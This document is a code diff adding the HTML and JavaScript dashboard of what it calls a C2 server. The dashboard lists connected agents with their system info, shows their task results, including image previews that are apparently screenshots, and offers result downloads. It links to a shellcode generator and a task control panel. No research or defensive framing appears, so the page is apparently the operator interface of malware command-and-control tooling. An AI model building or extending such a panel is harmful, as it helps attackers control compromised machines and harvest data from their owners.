@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Server Dashboard</title>
+    <style>
+        :root {
+            --bg: #f4f4f4;
+            --text: #333;
+            --card: #fff;
+            --border: #ddd;
+            --primary: #007BFF;
+            --success: #28a745;
+            --danger: #dc3545;
+            --warning: #ffc107;
+        }
+
+        [data-theme="dark"] {
+            --bg: #121212;
+            --text: #f4f4f4;
+            --card: #1e1e1e;
+            --border: #333;
+            --primary: #0d6efd;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 20px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        h1 {
+            color: var(--text);
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+        }
+
+        nav {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        nav a {
+            margin: 0 15px;
+            text-decoration: none;
+            color: var(--primary);
+            font-weight: 500;
+            font-size: 1.1em;
+            transition: color 0.3s;
+        }
+
+        nav a:hover {
+            color: var(--text);
+        }
+
+        .agent {
+            background-color: var(--card);
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: left;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .agent:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+
+        .task-result {
+            background-color: var(--bg);
+            padding: 15px;
+            margin-top: 15px;
+            border-left: 5px solid var(--primary);
+            white-space: pre-wrap;
+            border-radius: 4px;
+        }
+
+        .toggle-theme {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .toggle-theme:hover {
+            background-color: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+
+        #agents {
+            text-align: left;
+            margin-top: 30px;
+        }
+
+        pre {
+            background-color: var(--bg);
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+
+        .results-block {
+            background: var(--card);
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 6px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.07);
+        }
+    </style>
+</head>
+<body>
+    <button class="toggle-theme" onclick="toggleTheme()">🌙 Toggle Dark Mode</button>
+    
+    <div class="container">
+        <h1>Agent Dashboard</h1>
+        <nav>
+            <a href="/">Dashboard</a>
+            <a href="/shellcode">Shellcode Generator</a>
+            <a href="/control">Task Control Panel</a>
+        </nav>
+        <div id="agents">Loading agents...</div>
+    </div>
+
+    <script>
+        // Theme management
+        function toggleTheme() {
+            const current = localStorage.getItem('theme') || 'light';
+            const next = current === 'light' ? 'dark' : 'light';
+            localStorage.setItem('theme', next);
+            document.body.setAttribute('data-theme', next);
+        }
+
+        // Initialize theme
+        document.body.setAttribute('data-theme', localStorage.getItem('theme') || 'light');
+
+        async function fetchAgents() {
+            try {
+                const res = await fetch('/api/agents');
+                const agents = await res.json();
+                const container = document.getElementById('agents');
+                container.innerHTML = '';
+
+                if (agents.length === 0) {
+                    container.innerHTML = '<p style="text-align: center;">No agents connected.</p>';
+                    return;
+                }
+
+                for (const agent of agents) {
+                    const div = document.createElement('div');
+                    div.className = 'agent';
+                    div.innerHTML = `
+                        <strong>Agent ID:</strong> ${agent.agent_id}<br>
+                        <strong>Status:</strong> ${agent.status}<br>
+                        <strong>Last Seen:</strong> ${agent.last_seen}<br>
+                        <strong>System Info:</strong><br>
+                        <pre>${JSON.stringify(agent.system_info || {}, null, 2)}</pre>
+                    `;
+                    // Add results section
+                    fetchAndShowResults(agent.agent_id, div);
+                    container.appendChild(div);
+                }
+            } catch (error) {
+                document.getElementById('agents').innerHTML = '<p style="color: var(--danger); text-align: center;">Failed to load agents.</p>';
+                console.error(error);
+            }
+        }
+
+        async function fetchAndShowResults(agentId, containerDiv) {
+            const res = await fetch(`/api/results/${agentId}`);
+            const data = await res.json();
+            if (data.status === 'success') {
+                const results = data.results;
+                if (results.length === 0) {
+                    containerDiv.innerHTML += '<div class="results-block"><b>No results yet.</b></div>';
+                    return;
+                }
+                results.forEach(result => {
+                    const taskId = result.task_id;
+                    const type = result.type || 'Unknown';
+                    const time = result.timestamp || '';
+                    const status = result.status || '';
+                    let preview = '';
+                    // Show image preview if result is an image
+                    if (result.data && result.format && ['png', 'jpg', 'jpeg'].includes(result.format.toLowerCase())) {
+                        preview = `<img src="data:image/${result.format};base64,${result.data}" style="max-width:200px;max-height:120px;display:block;">`;
+                    } else if (result.result && result.result.data && result.result.format && ['png', 'jpg', 'jpeg'].includes(result.result.format.toLowerCase())) {
+                        preview = `<img src="data:image/${result.result.format};base64,${result.result.data}" style="max-width:200px;max-height:120px;display:block;">`;
+                    } else if (typeof result.result === 'string' && result.result.startsWith('data:image')) {
+                        preview = `<img src="${result.result}" style="max-width:200px;max-height:120px;display:block;">`;
+                    } else {
+                        preview = `<pre>${JSON.stringify(result.result || result.data, null, 2).slice(0, 300)}...</pre>`;
+                    }
+                    containerDiv.innerHTML += `
+                        <div class="results-block">
+                            <b>Task:</b> ${type} <b>Status:</b> ${status} <b>Time:</b> ${time}<br>
+                            ${preview}
+                            <a href="/api/results/download/${taskId}" download>Download</a>
+                        </div>
+                    `;
+                });
+            }
+        }
+
+        fetchAgents();
+        setInterval(fetchAgents, 10000); // Refresh every 10 seconds
+    </script>
+</body>
+</html>
